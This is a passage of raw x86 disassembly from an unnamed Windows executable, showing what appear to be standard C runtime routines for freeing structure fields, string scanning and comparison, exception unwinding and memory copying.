  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
